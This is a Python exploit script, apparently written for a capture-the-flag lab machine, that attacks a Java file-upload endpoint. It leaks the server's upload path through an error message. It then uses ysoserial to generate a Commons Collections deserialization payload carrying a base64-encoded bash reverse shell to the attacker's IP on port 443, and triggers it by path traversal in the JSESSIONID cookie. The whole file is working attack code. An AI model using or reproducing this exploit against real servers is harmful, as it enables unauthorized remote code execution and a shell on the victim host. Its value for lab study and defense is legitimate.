#!/usr/bin/env python3
import requests, socket
from fcntl import ioctl
from struct import pack
from base64 import b64encode
from os import system, remove
from time import sleep
from PIL import Image
from re import findall
from random import choice
from string import ascii_letters

url = "http://10.10.10.205:8080"
proxies = {'http':'http://127.0.0.1:8080'}

def get_ip(ifname:str="tun0"):
    '''
    Returngs current IP-address of specified interface (default tun0)
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(ioctl(s.fileno(), 0x8915, pack('256s', ifname[:15].encode()))[20:24])


# Trigger exception to leak file-location
def get_location() -> str:
    ''' 
    Upload file with empty name to leak directory
    '''
    r = requests.post(f"{url}/upload.jsp?email=chronos",files={"image" : ("", "bla")}, proxies=proxies)
    return findall(r"FileNotFoundException: (.*?) ",r.text)[0]


# Generate deserialization payload
def gen_payload(cmd:str="") -> None:
    '''
    Generates a bash-reverse-shell payload using ysoserial.jar
    '''
    if cmd == "":
        rev = b64encode(f"bash -i >& /dev/tcp/{get_ip()}/443 0>&1".encode()).decode()
        cmd = f"bash -c {{echo,{rev}}}|{{base64,-d}}|{{bash,-i}}"
    system(f'java -jar /opt/ysoserial.jar CommonsCollections2 "{cmd}" > payload.session 2>/dev/null')


# Upload file & trigger payload
def trigger(path:str, cmd:str="") -> None:
    '''
    Uploads specified file and triggers payload
    '''
    fname = ''.join(choice(ascii_letters) for i in range(8))
    gen_payload(cmd)
    location = f'../../../../..{path}/{fname}'
    print(f"[*] Accessing payload: {location}")
    cookie = {'JSESSIONID':location}
    [requests.post(f"{url}/upload.jsp?email=chronos", cookies=cookie, files={"image":(f"{fname}.session", open("payload.session","rb"))}, proxies=proxies) for x in range(2)]


if __name__ == "__main__":
    # 1.) Leak upload-path by uploading image
    leaked_path = get_location()
    print(f"[+] Upload path leaked: {leaked_path}!")
    # 2.) Upload deserialization payload
    trigger(leaked_path)
    remove("payload.session") # cleanup